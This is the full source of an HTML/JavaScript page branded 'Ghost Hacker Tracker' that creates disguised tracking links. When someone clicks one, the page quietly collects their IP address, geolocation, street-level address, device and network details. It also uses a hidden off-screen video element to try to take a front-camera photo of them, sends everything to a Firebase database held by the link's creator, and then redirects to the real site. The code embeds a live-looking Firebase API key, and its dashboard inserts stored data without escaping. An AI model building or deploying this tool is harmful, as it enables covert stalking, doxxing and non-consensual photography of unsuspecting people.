<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost ☠ Hacker Tracker</title>
    <style>
        /* Matrix Background Animation */
        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            position: relative;
            font-family: 'Courier New', monospace;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-color: black;
            overflow: hidden;
        }
        
        .matrix-column {
            position: absolute;
            top: 0;
            width: 15px;
            color: #00ff41;
            font-size: 18px;
            writing-mode: vertical-rl;
            text-orientation: upright;
            text-shadow: 0 0 5px #00ff41;
            animation: matrix-fall linear infinite;
            opacity: 0.8;
        }
        
        @keyframes matrix-fall {
            0% { transform: translateY(-100vh); }
            100% { transform: translateY(100vh); }
        }
        
        /* Main Container Styles */
        .container {
            max-width: 1000px;
            margin: 20px auto;
            background-color: rgba(0, 0, 0, 0.85);
            border: 1px solid #00ff41;
            border-radius: 5px;
            box-shadow: 0 0 15px #00ff41;
            color: #00ff41;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        header {
            text-align: center;
            padding: 20px;
            border-bottom: 1px solid #00ff41;
            margin-bottom: 20px;
        }
        
        h1, h2, h3, h4 {
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }
        
        h1 {
            font-size: 2.5em;
            margin: 0;
        }
        
        /* Input Section Styles */
        .input-section {
            background-color: rgba(0, 20, 0, 0.5);
            padding: 20px;
            border-radius: 5px;
            border: 1px solid #008f11;
            margin-bottom: 30px;
        }
        
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            background-color: rgba(0, 0, 0, 0.7);
            border: 1px solid #008f11;
            border-radius: 4px;
            font-size: 16px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
        }
        
        input[type="text"]::placeholder {
            color: #008f11;
            opacity: 0.7;
        }
        
        button {
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }
        
        .btn-primary {
            background-color: #008f11;
            color: black;
        }
        
        .btn-danger {
            background-color: #ff0033;
            color: white;
        }
        
        .btn-success {
            background-color: #00ff41;
            color: black;
        }
        
        button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 0 10px currentColor;
        }
        
        .result-box {
            background-color: rgba(0, 20, 0, 0.5);
            padding: 20px;
            border-radius: 5px;
            border: 1px solid #008f11;
            margin-top: 20px;
            display: none;
        }
        
        .url-display {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        
        .url-display input {
            background-color: rgba(0, 0, 0, 0.7);
            color: #00ff41;
            border: 1px solid #008f11;
        }
        
        /* Results Section Styles */
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .results-container {
            overflow-x: auto;
            border: 1px solid #008f11;
            border-radius: 5px;
            margin-top: 20px;
            background-color: rgba(0, 0, 0, 0.7);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #008f11;
        }
        
        th {
            background-color: rgba(0, 20, 0, 0.5);
            font-weight: bold;
            position: sticky;
            top: 0;
        }
        
        tr:hover {
            background-color: rgba(0, 30, 0, 0.3);
        }
        
        /* Modal Styles */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background-color: rgba(0, 10, 0, 0.95);
            padding: 25px;
            border-radius: 5px;
            width: 90%;
            max-width: 800px;
            max-height: 90vh;
            overflow: auto;
            position: relative;
            border: 1px solid #00ff41;
            box-shadow: 0 0 20px #00ff41;
        }
        
        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
            color: #00ff41;
            background: none;
            border: none;
        }
        
        .close-btn:hover {
            color: #ff0033;
        }
        
        .json-viewer {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 60vh;
            overflow-y: auto;
            margin-top: 15px;
            color: #00ff41;
            border: 1px solid #008f11;
        }
        
        .photo-container {
            text-align: center;
            margin-bottom: 20px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 5px;
            border: 1px solid #008f11;
        }
        
        .captured-photo {
            max-width: 100%;
            max-height: 300px;
            border: 1px solid #008f11;
            border-radius: 4px;
            margin-top: 10px;
        }
        
        /* Hidden camera elements */
        #camera-container {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        #camera-preview {
            display: none;
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 10, 0, 0.5);
        }
        
        ::-webkit-scrollbar-thumb {
            background: #008f11;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #00ff41;
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .input-group, .url-display, .controls {
                flex-direction: column;
            }
            
            .container {
                margin: 10px;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <!-- Matrix Background -->
    <div class="matrix-bg" id="matrix-bg"></div>

    <div class="container">
        <header>
            <h1>GHOST ☠ TRACKER</h1>
            <p>SYSTEM INITIALIZED - READY FOR OPERATION</p>
        </header>

        <div class="content">
            <div class="input-section">
                <h2>CREATE TRACKING LINK</h2>
                <div class="input-group">
                    <input type="text" id="target-url" placeholder="ENTER TARGET URL (HTTPS://EXAMPLE.COM)">
                    <button id="generate-btn" class="btn-primary">GENERATE LINK</button>
                </div>
                <div class="result-box" id="tracking-result">
                    <p>YOUR TRACKING LINK:</p>
                    <div class="url-display">
                        <input type="text" id="tracking-url" readonly>
                        <button id="copy-btn" class="btn-success">COPY</button>
                    </div>
                    <p><small>SHARE THIS LINK TO INITIATE TRACKING</small></p>
                </div>
            </div>

            <div class="tracking-results">
                <h2>TRACKING RESULTS</h2>
                <div class="controls">
                    <button id="refresh-btn" class="btn-primary">REFRESH DATA</button>
                    <button id="clear-btn" class="btn-danger">CLEAR ALL DATA</button>
                </div>
                <div class="results-container">
                    <table id="results-table">
                        <thead>
                            <tr>
                                <th>TIME</th>
                                <th>IP ADDRESS</th>
                                <th>LOCATION</th>
                                <th>DEVICE</th>
                                <th>ACTIONS</th>
                            </tr>
                        </thead>
                        <tbody id="results-body">
                            <!-- Results will be loaded here -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden camera elements -->
    <div id="camera-container">
        <video id="camera-preview" autoplay playsinline></video>
        <canvas id="camera-canvas" style="display:none;"></canvas>
    </div>

    <!-- Modal for Details -->
    <div id="details-modal" class="modal">
        <div class="modal-content">
            <button class="close-btn">&times;</button>
            <h3>DETAILED TRACKING DATA</h3>
            <div class="photo-container">
                <h4>CAPTURED IMAGE</h4>
                <img id="captured-photo" class="captured-photo" src="" alt="CAPTURED PHOTO">
                <p id="photo-timestamp"><small>IMAGE DATA NOT AVAILABLE</small></p>
            </div>
            <div id="tracking-details">
                <!-- Tracking details will be inserted here -->
            </div>
            <div id="json-content" class="json-viewer"></div>
        </div>
    </div>

    <script>
    // Matrix Background Generation
    function createMatrixEffect() {
        const container = document.getElementById('matrix-bg');
        const characters = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
        const cols = Math.floor(window.innerWidth / 15);
        
        for (let i = 0; i < cols; i++) {
            const col = document.createElement('div');
            col.className = 'matrix-column';
            col.style.left = `${i * 15}px`;
            col.style.animationDuration = `${5 + Math.random() * 10}s`;
            col.style.animationDelay = `${Math.random() * 5}s`;
            
            // Create falling characters
            let content = '';
            const length = 20 + Math.floor(Math.random() * 30);
            for (let j = 0; j < length; j++) {
                content += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            
            col.textContent = content;
            container.appendChild(col);
        }
    }

    // Firebase configuration
    const firebaseConfig = {
        apiKey: "AIzaSyDVGNv1TJynxk--MC9dbYb3GpUhSgd4Kqs",
        authDomain: "xhinta01-tools.firebaseapp.com",
        databaseURL: "https://xhinta01-tools-default-rtdb.firebaseio.com",
        projectId: "xhinta01-tools",
        storageBucket: "xhinta01-tools.appspot.com",
        messagingSenderId: "220271400453",
        appId: "1:220271400453:web:9d2332ffd52bc635692e6c"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // DOM Elements
    const elements = {
        targetUrlInput: document.getElementById('target-url'),
        generateBtn: document.getElementById('generate-btn'),
        trackingResult: document.getElementById('tracking-result'),
        trackingUrlInput: document.getElementById('tracking-url'),
        copyBtn: document.getElementById('copy-btn'),
        refreshBtn: document.getElementById('refresh-btn'),
        clearBtn: document.getElementById('clear-btn'),
        resultsBody: document.getElementById('results-body'),
        detailsModal: document.getElementById('details-modal'),
        capturedPhoto: document.getElementById('captured-photo'),
        photoTimestamp: document.getElementById('photo-timestamp'),
        trackingDetails: document.getElementById('tracking-details'),
        jsonContent: document.getElementById('json-content'),
        cameraPreview: document.getElementById('camera-preview'),
        cameraCanvas: document.getElementById('camera-canvas'),
        closeBtns: document.querySelectorAll('.close-btn')
    };

    let cameraStream = null;

    // Initialize the application
    function init() {
        createMatrixEffect();
        setupEventListeners();
        loadTrackingResults();
        checkForTrackingRequest();
    }

    // Set up all event listeners
    function setupEventListeners() {
        // Fixed generate button event listener
        elements.generateBtn.addEventListener('click', generateTrackingUrl);
        elements.copyBtn.addEventListener('click', copyToClipboard);
        elements.refreshBtn.addEventListener('click', loadTrackingResults);
        elements.clearBtn.addEventListener('click', clearAllData);
        
        elements.closeBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                elements.detailsModal.style.display = 'none';
            });
        });
    }

    // Generate Tracking URL - Fixed function
    function generateTrackingUrl() {
        const targetUrl = elements.targetUrlInput.value.trim();
        
        if (!targetUrl) {
            alert('PLEASE ENTER A TARGET URL');
            return;
        }
        
        try {
            new URL(targetUrl);
        } catch {
            alert('INVALID URL FORMAT. INCLUDE HTTP:// OR HTTPS://');
            return;
        }
        
        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 10);
        const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${trackingId}&url=${encodeURIComponent(targetUrl)}`;
        
        elements.trackingUrlInput.value = trackingUrl;
        elements.trackingResult.style.display = 'block';
        
        // Save to Firebase
        database.ref('trackingLinks/' + trackingId).set({
            targetUrl: targetUrl,
            createdAt: firebase.database.ServerValue.TIMESTAMP,
            clickCount: 0
        }).catch(error => {
            console.error('Error saving to Firebase:', error);
        });
    }

    // Copy to Clipboard
    function copyToClipboard() {
        elements.trackingUrlInput.select();
        document.execCommand('copy');
        alert('LINK COPIED TO CLIPBOARD');
    }

    // Format JSON for display
    function formatJSON(data) {
        return JSON.stringify(data, null, 2);
    }

    // Format date
    function formatDate(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleString();
    }

    // Load Tracking Results from Firebase
    async function loadTrackingResults() {
        try {
            const snapshot = await database.ref('trackingData').orderByChild('timestamp').limitToLast(50).once('value');
            const data = snapshot.val();
            
            if (!data) {
                elements.resultsBody.innerHTML = '<tr><td colspan="5">NO TRACKING DATA AVAILABLE</td></tr>';
                return;
            }
            
            // Convert to array and reverse to show latest first
            const dataArray = Object.entries(data).map(([key, value]) => ({
                id: key,
                ...value
            })).reverse();
            
            elements.resultsBody.innerHTML = dataArray.map(item => `
                <tr>
                    <td>${formatDate(item.timestamp)}</td>
                    <td>${item.ip || 'UNKNOWN'}</td>
                    <td>
                        ${item.location?.city || 'UNKNOWN'}
                        ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
                    </td>
                    <td>${item.device?.type || 'UNKNOWN'}</td>
                    <td>
                        <button class="view-details" data-id="${item.id}">VIEW DETAILS</button>
                    </td>
                </tr>
            `).join('');
            
            // Add event listeners to detail buttons
            document.querySelectorAll('.view-details').forEach(btn => {
                btn.addEventListener('click', () => {
                    showDetails(btn.dataset.id);
                });
            });
        } catch (error) {
            console.error('ERROR LOADING DATA:', error);
            elements.resultsBody.innerHTML = '<tr><td colspan="5">ERROR LOADING DATA</td></tr>';
        }
    }

    // Show detailed tracking data
    async function showDetails(id) {
        try {
            const snapshot = await database.ref('trackingData/' + id).once('value');
            const data = snapshot.val();
            
            if (!data) return;
            
            // Display photo if available
            if (data.cameraCapture?.imageData) {
                elements.capturedPhoto.src = data.cameraCapture.imageData;
                elements.photoTimestamp.innerHTML = `<small>CAPTURED AT: ${formatDate(data.cameraCapture.timestamp)}</small>`;
                elements.capturedPhoto.style.display = 'block';
            } else {
                elements.capturedPhoto.style.display = 'none';
                elements.photoTimestamp.textContent = 'NO IMAGE DATA AVAILABLE';
            }
            
            // Display other tracking details
            elements.trackingDetails.innerHTML = `
                <h4>TRACKING DETAILS</h4>
                <p><strong>TARGET URL:</strong> ${data.target || 'UNKNOWN'}</p>
                <p><strong>TIME:</strong> ${formatDate(data.timestamp)}</p>
                <p><strong>IP ADDRESS:</strong> ${data.ip || 'UNKNOWN'}</p>
                <p><strong>LOCATION:</strong> ${data.location?.city || 'UNKNOWN'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
                <p><strong>DEVICE:</strong> ${data.device?.type || 'UNKNOWN'} (${data.device?.platform || 'UNKNOWN'})</p>
                <p><strong>USER AGENT:</strong> ${data.userAgent || 'UNKNOWN'}</p>
            `;
            
            // Show raw JSON data
            elements.jsonContent.textContent = formatJSON(data);
            elements.detailsModal.style.display = 'flex';
        } catch (error) {
            console.error('ERROR SHOWING DETAILS:', error);
        }
    }

    // Initialize camera
    async function initCamera() {
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false 
            });
            elements.cameraPreview.srcObject = cameraStream;
            return true;
        } catch (err) {
            console.error('CAMERA ACCESS ERROR:', err);
            return false;
        }
    }

    // Capture photo from camera
    async function capturePhoto() {
        if (!cameraStream) return null;
        
        try {
            const canvas = elements.cameraCanvas;
            const video = elements.cameraPreview;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Stop camera stream immediately after capture
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
            
            return canvas.toDataURL('image/jpeg', 0.7);
        } catch (err) {
            console.error('PHOTO CAPTURE ERROR:', err);
            return null;
        }
    }

    // Clear All Data
    async function clearAllData() {
        if (confirm('WARNING: THIS WILL DELETE ALL TRACKING DATA. CONTINUE?')) {
            try {
                await database.ref('trackingData').remove();
                alert('ALL TRACKING DATA HAS BEEN CLEARED');
                loadTrackingResults();
            } catch (error) {
                console.error('ERROR CLEARING DATA:', error);
                alert('FAILED TO CLEAR DATA');
            }
        }
    }

    // Check for tracking request in URL
    function checkForTrackingRequest() {
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('track');
        const targetUrl = urlParams.get('url');
        
        if (trackingId && targetUrl) {
            processTrackingRequest(trackingId, targetUrl);
        }
    }

    // Process tracking request
    async function processTrackingRequest(trackingId, targetUrl) {
        // Collect device and network data
        const trackingData = {
            timestamp: firebase.database.ServerValue.TIMESTAMP,
            target: decodeURIComponent(targetUrl),
            referrer: document.referrer || 'DIRECT',
            userAgent: navigator.userAgent,
            device: {
                type: /mobile/i.test(navigator.userAgent) ? 'MOBILE' : 'DESKTOP',
                platform: navigator.platform,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled
            },
            network: {
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null
            }
        };

        try {
            // Initialize camera and capture photo
            const cameraAccess = await initCamera();
            if (cameraAccess) {
                const photoData = await capturePhoto();
                if (photoData) {
                    trackingData.cameraCapture = {
                        timestamp: firebase.database.ServerValue.TIMESTAMP,
                        imageData: photoData,
                        imageSize: {
                            width: elements.cameraCanvas.width,
                            height: elements.cameraCanvas.height
                        }
                    };
                }
            }

            // Get IP and location data
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            trackingData.ip = ipData.ip;
            trackingData.latitude = ipData.latitude;
            trackingData.longitude = ipData.longitude;
            trackingData.location = {
                city: ipData.city,
                region: ipData.region,
                country: ipData.country_name,
                countryCode: ipData.country_code,
                postalCode: ipData.postal,
                timezone: ipData.timezone
            };
            
            // Get detailed address from Nominatim
            if (ipData.latitude && ipData.longitude) {
                const nominatimResponse = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
                );
                const nominatimData = await nominatimResponse.json();
                
                trackingData.nominatim = {
                    display_name: nominatimData.display_name,
                    address: nominatimData.address,
                    boundingbox: nominatimData.boundingbox
                };
            }

            // Save to Firebase
            const newTrackingRef = database.ref('trackingData').push();
            await newTrackingRef.set(trackingData);
            
            // Update click count
            await database.ref('trackingLinks/' + trackingId).transaction(link => {
                if (link) {
                    link.clickCount = (link.clickCount || 0) + 1;
                }
                return link;
            });
            
            // Redirect to target URL
            window.location.href = decodeURIComponent(targetUrl);
        } catch (error) {
            console.error('ERROR IN TRACKING PROCESS:', error);
            window.location.href = decodeURIComponent(targetUrl);
        }
    }

    // Initialize the application
    init();
    </script>
</body>
</html>
